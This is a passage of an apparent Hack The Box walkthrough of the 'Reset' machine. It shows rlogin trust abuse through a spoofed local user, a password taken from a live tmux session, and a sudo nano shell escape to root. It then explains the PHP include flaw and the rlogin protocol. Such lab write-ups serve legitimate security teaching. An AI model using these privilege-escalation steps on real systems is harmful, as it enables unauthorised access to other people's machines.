+</span></code></pre></div></div>
+<p>As www-data, I can read <code class="language-plaintext highlighter-rouge">sadm</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@reset:/home/sadm$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 36
+drwxr-xr-x 4 sadm sadm 4096 Jun  4 14:57 .
+drwxr-xr-x 4 root root 4096 Jun  2 11:34 ..
+lrwxrwxrwx 1 sadm sadm    9 Dec  6 13:12 .bash_history -&gt; /dev/null 
+-rw-r--r-- 1 sadm sadm  220 Dec  6 13:02 .bash_logout
+-rw-r--r-- 1 sadm sadm 3771 Dec  6 13:02 .bashrc
+drwx------ 2 sadm sadm 4096 Jun  2 11:34 .cache
+drwxrwxr-x 3 sadm sadm 4096 Jun  2 11:34 .local
+-rw-r--r-- 1 sadm sadm  807 Dec  6 13:02 .profile
+-rw------- 1 sadm sadm    7 Dec  6 15:49 .rhosts
+-rw-r--r-- 1 root root   33 Apr 10 09:45 user.txt
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">.rhosts</code> is interesting, but I can’t read it yet. I’ll come back to that.</p>
+<h4 id="processes">Processes</h4>
+<p>Looking at the running processes, I’ll note an interesting one running as sadm:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@reset:/$</span><span class="w"> </span>ps auxww | <span class="nb">grep </span>sadm
+<span class="go">sadm        1104  0.0  0.1   8764  3880 ?        Ss   Jun03   0:00 tmux new-session -d -s sadm_session
+sadm        1111  0.0  0.2   8676  5452 pts/3    Ss+  Jun03   0:00 -bash
+sadm       11267  0.0  0.4  17096  9432 ?        Ss   11:03   0:00 /lib/systemd/systemd --user
+sadm       11268  0.0  0.1 169396  4008 ?        S    11:03   0:00 (sd-pam)
+sadm       11274  0.0  0.2   8812  5616 pts/1    S+   11:03   0:00 -bash
+</span></code></pre></div></div>
+<p>There is a <code class="language-plaintext highlighter-rouge">tmux</code> session running as sadm. I’ll note this for later.</p>
+<h4 id="r-commands">r-commands</h4>
+<p><code class="language-plaintext highlighter-rouge">rlogin</code> is configured in the <code class="language-plaintext highlighter-rouge">/etc/hosts.equiv</code> file, which is present on Reset:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@reset:/$</span><span class="w"> </span><span class="nb">cat</span> /etc/hosts.equiv 
+<span class="c"># /etc/hosts.equiv: list  of  hosts  and  users  that are granted "trusted" r
+#                   command access to your system .
+</span><span class="go">- root
+- local
++ sadm
+</span></code></pre></div></div>
+<p>This says that root and local cannot login, but sadm can.</p>
+<p>The <a href="https://en.wikipedia.org/wiki/Berkeley_r-commands#Security">security section</a> of the r-commands page talks about major issues:</p>
+<blockquote>
+<p>Those r-commands which involve user authentication (<code class="language-plaintext highlighter-rouge">rcp</code>, <code class="language-plaintext highlighter-rouge">rexec</code>, <code class="language-plaintext highlighter-rouge">rlogin</code>, and <code class="language-plaintext highlighter-rouge">rsh</code>) share several serious security vulnerabilities:</p>
+<ul>
+<li>All information, including passwords, is transmitted unencrypted (making it vulnerable to interception).</li>
+<li>The <code class="language-plaintext highlighter-rouge">.rlogin</code> (or <code class="language-plaintext highlighter-rouge">.rhosts</code>) file is easy to misuse. They are designed to allow logins without a <a href="https://en.wikipedia.org/wiki/Password">password</a>, but their reliance on remote usernames, hostnames, and IP addresses is exploitable. For this reason many corporate system administrators prohibit <code class="language-plaintext highlighter-rouge">.rhosts</code> files, and actively scrutinize their networks for offenders.</li>
+<li>The protocol partly relies on the remote party’s <code class="language-plaintext highlighter-rouge">rlogin</code> client to provide information honestly, including source port and source host name. A malicious client can forge this and gain access, as the <code class="language-plaintext highlighter-rouge">rlogin</code> protocol has no means of <a href="https://en.wikipedia.org/wiki/Authentication">authenticating</a> the client is running on a trusted machine. It also cannot check if the requesting client on a trusted machine is the real <code class="language-plaintext highlighter-rouge">rlogin</code> client, meaning that malicious programs may pretend to be a standard-conforming <code class="language-plaintext highlighter-rouge">rlogin</code> client by using the same protocols.</li>
+<li>The common practice of mounting users’ home directories via <a href="https://en.wikipedia.org/wiki/Network_File_System">Network File System</a> exposes rlogin to attack by means of fake <code class="language-plaintext highlighter-rouge">.rhosts</code> files - this means that any of its security faults automatically plague <code class="language-plaintext highlighter-rouge">rlogin</code>.</li>
+</ul>
+</blockquote>
+<p>Authentication relies on the remote name, which can be faked.</p>
+<h3 id="rlogin">rlogin</h3>
+<p>To connect with <code class="language-plaintext highlighter-rouge">rlogin</code>, I’ll install the r-command clients with <code class="language-plaintext highlighter-rouge">pt install rsh-redone-client</code>. The clients require a password <em>unless</em> I’m trying to connect as a user with the same name as on my local system. I’ll look at the protocol a bit in <a href="#rlogin-protocol">Beyond Root</a>.</p>
+<p>To proceed with Reset, on my local system I’ll create a user name radm and set a password:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>useradd sadm
+<span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>passwd sadm
+<span class="go">New password:
+Retype new password:
+passwd: password updated successfully  
+</span></code></pre></div></div>
+<p>Now I can switch to that user, and login without a password and it looks just like SSH:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>su - sadm
+<span class="go">su: warning: cannot change directory to /home/sadm: No such file or directory
+</span><span class="gp">$</span><span class="w"> </span>rlogin 10.129.234.130
+<span class="go">Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-140-generic x86_64)
+...[snip]...
+</span><span class="gp">sadm@reset:~$</span><span class="w">
+</span></code></pre></div></div>
+<h3 id="recover-password">Recover Password</h3>
+<p>I noted above there was a <code class="language-plaintext highlighter-rouge">tmux</code> session running as radm. Tmux is a tool that allows for making multiple windows and splitting windows within a single terminal session. It’s a fantastic tool, and one I use in literally in every terminal session I open. It also allows a user to disconnect and reconnect, picking up in the same place they left off. In a job I had many years ago, the majority of my work was done by SSHing into a remote server. I would have a <code class="language-plaintext highlighter-rouge">tmux</code> session running so when I came back, all my terminals were just where I left them.</p>
+<p>With a shell as radm, I can see this session:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sadm@reset:~$</span><span class="w"> </span>tmux <span class="nb">ls</span>
+<span class="go">sadm_session: 1 windows (created Tue Jun  3 21:54:33 2025)
+</span></code></pre></div></div>
+<p>I can attach to this session with <code class="language-plaintext highlighter-rouge">tmux a -t &lt;session name&gt;</code>, so <code class="language-plaintext highlighter-rouge">tmux a -t sadm_session</code>:</p>
+<picture>
+<source srcset="/img/image-20250604065739849.webp" type="image/webp"/>
+<img alt="image-20250604065739849" class="include_image" loading="lazy" src="/img/image-20250604065739849.png"/>
+</picture>
+<p>The green bar at the bottom is <code class="language-plaintext highlighter-rouge">tmux</code>. I actually have two nested <code class="language-plaintext highlighter-rouge">tmux</code> sessions going. The top bar is the session on Reset. The bottom bar is on my host. I have three windows currently on my session, and there’s just one on Reset. By default, the key to interact with <code class="language-plaintext highlighter-rouge">tmux</code> is Ctrl-a, but I typically remap mine to Ctrl-b, which works out well here as Ctrl-a will allow me to control the remote session and Ctrl-b mine.</p>
+<p>Continuing on the box, there’s the password for sadm, “7lE2PAfVHfjz4HpE”.</p>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<p>sadm can run three commands as any user on Reset:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sadm@reset:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">Matching Defaults entries for sadm on reset:
+    env_reset, timestamp_timeout=-1, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, !syslog
+
+User sadm may run the following commands on reset:
+    (ALL) PASSWD: /usr/bin/nano /etc/firewall.sh
+    (ALL) PASSWD: /usr/bin/tail /var/log/syslog
+    (ALL) PASSWD: /usr/bin/tail /var/log/auth.log
+</span></code></pre></div></div>
+<h3 id="nano-escape">nano Escape</h3>
+<p><code class="language-plaintext highlighter-rouge">nano</code> has the ability to run shell commands. I’ll use <code class="language-plaintext highlighter-rouge">sudo</code> to open <code class="language-plaintext highlighter-rouge">/etc/firewall.sh</code> as root, <code class="language-plaintext highlighter-rouge">sudo nano /etc/firewall.sh</code>, which results in:</p>
+<picture>
+<source srcset="/img/image-20250604070156752.webp" type="image/webp"/>
+<img alt="image-20250604070156752" class="include_image" loading="lazy" src="/img/image-20250604070156752.png"/>
+</picture>
+<p>Ctrl-r will open the read file menu:</p>
+<picture>
+<source srcset="/img/image-20250604070256719.webp" type="image/webp"/>
+<img alt="image-20250604070256719" class="include_image" loading="lazy" src="/img/image-20250604070256719.png"/>
+</picture>
+<p>From there, Ctrl-x will open the “Execute Command” prompt:</p>
+<picture>
+<source srcset="/img/image-20250604070327448.webp" type="image/webp"/>
+<img alt="image-20250604070327448" class="include_image" loading="lazy" src="/img/image-20250604070327448.png"/>
+</picture>
+<p>I can try just running <code class="language-plaintext highlighter-rouge">bash</code>, but it breaks terminal. I need to run <code class="language-plaintext highlighter-rouge">reset; bash 1&gt;&amp;0 2&gt;&amp;0</code>. This will reset the terminal (removing all that <code class="language-plaintext highlighter-rouge">nano</code> did to make it an application instead of working line to line) and then run <code class="language-plaintext highlighter-rouge">bash</code>. The file descriptor redirections seem a bit confusing, as it looks like both stdout and stderr are being redirected to stdin. What’s happening here is that stdin is almost certainly the terminal, and so this is saying to have both stdout and stderr output to that terminal device.</p>
+<p>After running, the terminal is still a bit messed up, but there’s a root shell:</p>
+<picture>
+<source srcset="/img/image-20250604070931881.webp" type="image/webp"/>
+<img alt="image-20250604070931881" class="include_image" loading="lazy" src="/img/image-20250604070931881.png"/>
+</picture>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">reset</code> again and it makes a clear terminal.</p>
+<p>From here I can read <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@reset:~#</span><span class="w"> </span><span class="nb">cat </span>root_279e22f8.txt 
+<span class="go">7ad6951bcb5a2edaffd7908b013d29b0
+</span></code></pre></div></div>
+<h2 id="beyond-root">Beyond Root</h2>
+<h3 id="web-application-source">Web Application Source</h3>
+<p><code class="language-plaintext highlighter-rouge">dashboard.php</code> has code at the top. First, there’s a check that it’s the admin user, or else it redirects to <code class="language-plaintext highlighter-rouge">index.php</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">session_start</span><span class="p">();</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'admin'</span><span class="p">]))</span> <span class="p">{</span> 
+    <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: index.php'</span><span class="p">);</span>                  
+    <span class="k">exit</span><span class="p">;</span>
+<span class="p">}</span>   
+</code></pre></div></div>
+<p>Next comes the check that prevented directory traversal:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">define</span><span class="p">(</span><span class="s1">'ALLOWED_BASE_DIR'</span><span class="p">,</span> <span class="s1">'/var/log'</span><span class="p">);</span>
+<span class="k">function</span> <span class="n">isValidFile</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">)</span> <span class="p">{</span> 
+    <span class="nv">$realPath</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">);</span>     
+    <span class="k">return</span> <span class="nv">$realPath</span> <span class="o">&amp;&amp;</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$realPath</span><span class="p">,</span> <span class="no">ALLOWED_BASE_DIR</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>  
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">isValidFile</code> <a href="https://www.php.net/manual/en/function.realpath.php">function</a> uses <code class="language-plaintext highlighter-rouge">readpath</code> to resolve any <code class="language-plaintext highlighter-rouge">../</code> or <code class="language-plaintext highlighter-rouge">./</code> or extra <code class="language-plaintext highlighter-rouge">/</code> characters. Then it checks if the result starts with <code class="language-plaintext highlighter-rouge">/var/log</code>. So anything outside of <code class="language-plaintext highlighter-rouge">/var/log</code> will return false here.</p>
+<p>Next, it reads from the file:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$logs</span> <span class="o">=</span> <span class="p">[];</span>   
+<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_METHOD'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'POST'</span><span class="p">)</span> <span class="p">{</span>   
+    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'file'</span><span class="p">];</span>                                                                                                            
+    <span class="k">if</span> <span class="p">(</span><span class="nf">isValidFile</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span> 
+            <span class="nb">ob_start</span><span class="p">();</span>
+            <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+            <span class="nv">$logs</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nb">ob_get_clean</span><span class="p">());</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>          
+            <span class="nv">$logs</span> <span class="o">=</span> <span class="p">[</span><span class="s2">"Cannot read </span><span class="nv">$file</span><span class="s2">"</span><span class="p">];</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nb">http_response_code</span><span class="p">(</span><span class="mi">400</span><span class="p">);</span>
+        <span class="nv">$logs</span> <span class="o">=</span> <span class="p">[</span><span class="s2">"Invalid file path"</span><span class="p">];</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>It makes sure that the file is valid (starts with <code class="language-plaintext highlighter-rouge">/var/log</code>) and <code class="language-plaintext highlighter-rouge">is_readable</code> (which blocks any command injections). Then it passes the file to <code class="language-plaintext highlighter-rouge">include</code>, which is the vulnerability here. If it used <code class="language-plaintext highlighter-rouge">file_get_contents</code>, this would be nearly impossible to exploit.</p>
+<h3 id="rlogin-protocol">rlogin Protocol</h3>
+<h4 id="rfc">RFC</h4>
+<p>BSD Rlogin is defined in <a href="https://datatracker.ietf.org/doc/html/rfc1282">RFC-1282</a> (from 1991!). For connection establishment, the client sends:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        &lt;null&gt;
+        client-user-name&lt;null&gt;
+        server-user-name&lt;null&gt;
+        terminal-type/speed&lt;null&gt;
+</code></pre></div></div>
+<p>It gives the example:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        &lt;null&gt;
+        bostic&lt;null&gt;
+        kbostic&lt;null&gt;
+        vt100/9600&lt;null&gt;
+</code></pre></div></div>
+<p>The server responds with a null. Then the server sends 0x80, to request the windows size. The client’s response is as follows:</p>
+<blockquote>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   The window change control sequence is 12 bytes in length, consisting
+   of a magic cookie (two consecutive bytes of hex FF), followed by two
+   bytes containing lower-case ASCII "s", then 8 bytes containing the
+   16-bit values for the number of character rows, the number of
+   characters per row, the number of pixels in the X direction, and the
+   number of pixels in the Y direction, in network byte order.  Thus:
+
+        FF FF s s rr cc xp yp
+</code></pre></div> </div>
+</blockquote>
+<h4 id="wireshark">WireShark</h4>
+<p>I’ll connect over Wireshark and see what’s exchanged on running <code class="language-plaintext highlighter-rouge">rlogin 10.129.234.130</code> as a user named sadm:</p>
+<picture>
+<source srcset="/img/image-20250604151802274.webp" type="image/webp"/>
+<img alt="image-20250604151802274" class="include_image" loading="lazy" src="/img/image-20250604151802274.png"/>
+</picture>
+<p>The client sends the user name and terminal info. Then the server sends 0x00, then 0x80, to which the client responds with the window size frame. Then the server just sends the banners and a shell.</p>
+<p>If I try as a different user, say with <code class="language-plaintext highlighter-rouge">sudo rlogin 10.129.234.130</code>, it shows root:root as the user and asks for a password:</p>
+<picture>
+<source srcset="/img/image-20250604152103617.webp" type="image/webp"/>
+<img alt="image-20250604152103617" class="include_image" loading="lazy" src="/img/image-20250604152103617.png"/>
+</picture>
+<p>If I tell it to login as sadm, it sends the remote name as sadm, but still needs a password:</p>
+<picture>
+<source srcset="/img/image-20250604152208460.webp" type="image/webp"/>
+<img alt="image-20250604152208460" class="include_image" loading="lazy" src="/img/image-20250604152208460.png"/>
+</picture>
+<p>I wasn’t able to get rlogin to change the local user to sadm without creating a user and running as that user.</p>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2025/07/15/htb-reset.html"></a>
+</article>
